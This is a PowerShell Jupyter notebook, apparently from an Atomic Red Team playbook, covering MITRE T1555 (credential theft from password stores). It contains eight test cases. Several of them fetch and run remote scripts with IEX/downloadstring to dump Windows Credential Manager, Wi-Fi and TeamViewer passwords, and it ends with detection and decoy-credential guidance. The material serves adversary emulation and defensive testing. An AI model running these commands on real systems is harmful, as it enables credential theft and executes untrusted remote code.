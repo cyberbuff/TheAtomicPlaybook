{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "43761467",
   "metadata": {},
   "source": "# T1555 - Credentials from Password Stores\nAdversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information."
  },
  {
   "cell_type": "markdown",
   "id": "9e0554f6",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "daa356b8",
   "metadata": {},
   "source": "### Atomic Test #1 - Extract Windows Credential Manager via VBA\nThis module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Word must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27768ede",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ad787a8a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d432106",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "c44282b6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca624bc3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "38df3001",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]",
    "This module will extract the credentials from Windows Credential Manager",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c94079a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "e6d13b93",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
    "This module will extract the credentials from Windows Credential Manager",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "042b7358",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "5e858f4e",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]",
    "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nvaultcmd /listcreds:\"Windows Credentials\" /all\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf353c84",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "45ad3649",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]",
    "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nvaultcmd /listcreds:\"Web Credentials\" /all\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "814c5121",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "2c02926f",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - WinPwn - Loot local Credentials - lazagne",
    "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "737425c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "e2808d35",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - WinPwn - Loot local Credentials - Wifi Credentials",
    "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5e2fd33",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "dd64cf85",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords",
    "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "719611db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "72f9e868",
   "metadata": {},
   "source": "## Detection\nMonitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications."
  },
  {
   "cell_type": "markdown",
   "id": "665a9004",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy Credentials \n Create user credentials that are used for active defense purposes. \n\n Seed a target system with credentials (such as username/password, browser tokens, and other forms of authentication data) for the purpose of engagement. Decoy credentials can be planted in many locations and leveraged in a variety of ways.\n#### Opportunity\nIn order to prolong an adversary engagement operation or enable detections, there is an opportunity to introduce credentials to an adversary that you want them to collect and use.\n#### Use Case\nA defender can plant decoy credentials across an array of locations to increase the chances of an adversary finding and using them.\n#### Procedures\nCreate user credentials for a decoy account, such as 'User ABC'.  Store those credentials in the browser and other places on the system to see if an adversary attempts to harvest them.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}